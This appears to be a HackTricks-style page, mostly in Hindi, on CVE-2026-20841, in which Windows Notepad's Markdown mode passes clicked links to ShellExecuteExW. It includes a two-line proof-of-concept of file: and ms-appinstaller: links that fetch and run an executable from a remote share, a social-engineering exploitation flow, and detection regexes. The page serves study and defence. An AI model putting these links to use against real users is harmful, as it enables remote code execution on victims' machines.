# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

आधुनिक Windows applications जो Markdown/HTML render करते हैं अक्सर उपयोगकर्ता-प्रदान किए गए लिंक को clickable elements में बदल देते हैं और उन्हें `ShellExecuteExW` को सौंप देते हैं। कठोर scheme allowlisting के बिना, किसी भी रजिस्टर्ड protocol handler (उदा., `file:`, `ms-appinstaller:`) को ट्रिगर किया जा सकता है, जिससे वर्तमान उपयोगकर्ता संदर्भ में कोड निष्पादन हो सकता है।

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad केवल `.md` एक्सटेंशन्स के लिए Markdown mode चुनता है, `sub_1400ED5D0()` में एक fixed string comparison के माध्यम से।
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (rendered as `[target](target)`), इसलिए दोनों syntaxes payloads और detections के लिए मायने रखते हैं।
- Link clicks are processed in `sub_140170F60()`, जो कमजोर filtering करता है और फिर `ShellExecuteExW` को कॉल करता है।
- `ShellExecuteExW` किसी भी **configured protocol handler** पर dispatch करता है, सिर्फ HTTP(S) नहीं।

### Payload considerations
- लिंक में किसी भी `\\` sequences को `ShellExecuteExW` से पहले **`\` में normalized** किया जाता है, जो UNC/path crafting और detection को प्रभावित करता है।
- `.md` फ़ाइलें डिफ़ॉल्ट रूप से Notepad से **associated नहीं** होती हैं; victim को फिर भी फ़ाइल Notepad में खोलनी और लिंक पर क्लिक करना होगा, लेकिन एक बार rendered, लिंक clickable हो जाता है।
- Dangerous example schemes:
- `file://` स्थानीय/UNC payload लॉन्च करने के लिए।
- `ms-appinstaller://` App Installer flows को ट्रिगर करने के लिए। अन्य locally registered schemes भी abusable हो सकते हैं।

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. एक **`.md` file** तैयार करें ताकि Notepad इसे Markdown के रूप में रेंडर करे।
2. किसी खतरनाक URI स्कीम (`file:`, `ms-appinstaller:`, या किसी भी इंस्टॉल्ड हैंडलर) का उपयोग करके एक लिंक एम्बेड करें।
3. फ़ाइल को (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB या समान) के माध्यम से भेजें और उपयोगकर्ता को इसे Notepad में खोलने के लिए मनायें।
4. क्लिक करने पर, **normalized link** को `ShellExecuteExW` को सौंपा जाता है और संबंधित protocol handler उपयोगकर्ता के संदर्भ में संदर्भित सामग्री को निष्पादित करता है।

## Detection ideas
- उन पोर्ट्स/प्रोटोकॉल्स पर `.md` फ़ाइलों के ट्रांसफ़र की निगरानी करें जो सामान्यतः दस्तावेज़ वितरित करते हैं: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown links (standard and autolink) को पार्स करें और **case-insensitive** `file:` या `ms-appinstaller:` की जांच करें।
- Vendor-guided regexes का उपयोग करके remote resource access पकड़ा जा सकता है:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Patch व्यवहार कथित तौर पर **allowlists local files and HTTP(S)**; `ShellExecuteExW` तक पहुँचने वाली कोई भी अन्य चीज़ संदिग्ध है। आवश्यकतानुसार डिटेक्शन को अन्य इंस्टॉल किए गए protocol handlers तक बढ़ाएँ, क्योंकि attack surface सिस्टम के अनुसार भिन्न होता है।

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
